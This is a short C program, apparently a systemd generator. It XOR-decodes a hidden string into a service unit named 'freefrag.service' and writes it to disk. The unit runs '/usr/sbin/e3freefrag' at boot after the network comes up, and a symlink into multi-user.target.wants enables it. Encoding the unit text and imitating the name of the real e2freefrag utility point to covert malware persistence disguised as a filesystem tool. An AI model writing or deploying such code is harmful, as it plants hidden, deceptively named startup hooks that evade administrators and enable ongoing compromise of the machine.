#include<stdio.h>
#include<string.h>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, const char * argv[])
{
        /*
        printf("%s\n", argv[0]);
        printf("%s\n", argv[1]);
        printf("%s\n", argv[2]);
        printf("%s\n", argv[3]);
        */
        char en[] = "\xa4\xaa\x91\x96\x8b\xa2\xf5\xa8\x9e\x91\x8b\x8c\xc2\xb1\x9a\x8b\x88\x90\x8d\x94"
"\xb2\x9e\x91\x9e\x98\x9a\x8d\xd1\x8c\x9a\x8d\x89\x96\x9c\x9a\xf5\xbe\x99\x8b\x9a"
"\x8d\xc2\xb1\x9a\x8b\x88\x90\x8d\x94\xb2\x9e\x91\x9e\x98\x9a\x8d\xd1\x8c\x9a\x8d"
"\x89\x96\x9c\x9a\xf5\xf5\xa4\xac\x9a\x8d\x89\x96\x9c\x9a\xa2\xf5\xab\x86\x8f\x9a"
"\xc2\x90\x91\x9a\x8c\x97\x90\x8b\xf5\xba\x87\x9a\x9c\xac\x8b\x9e\x8d\x8b\xc2\xd0"
"\x8a\x8c\x8d\xd0\x8c\x9d\x96\x91\xd0\x9a\xcc\x99\x8d\x9a\x9a\x99\x8d\x9e\x98\xf5"
"\xf5\xa4\xb6\x91\x8c\x8b\x9e\x93\x93\xa2\xf5\xa8\x9e\x91\x8b\x9a\x9b\xbd\x86\xc2"
"\x92\x8a\x93\x8b\x96\xd2\x8a\x8c\x9a\x8d\xd1\x8b\x9e\x8d\x98\x9a\x8b\xf5";

        int len = strlen(en);
        int i;

        for (i = 0; i < len; i++) {
                en[i] = en[i] ^ 255;
        }

        // printf("%s\n", en);
        char buf[1024], buf2[1024], buf3[1024];
        snprintf(buf, 1024, "%s/%s", argv[1], "freefrag.service");
        snprintf(buf3, 1024, "%s/multi-user.target.wants", argv[1]);
        mkdir(buf3, 0755);
        snprintf(buf2, 1024, "%s/multi-user.target.wants/%s", argv[1], "freefrag.service");
        FILE * fp = fopen(buf, "w");
        fwrite(en, len, 1, fp);
        fclose(fp);

        symlink(buf, buf2);
        return 0;
}
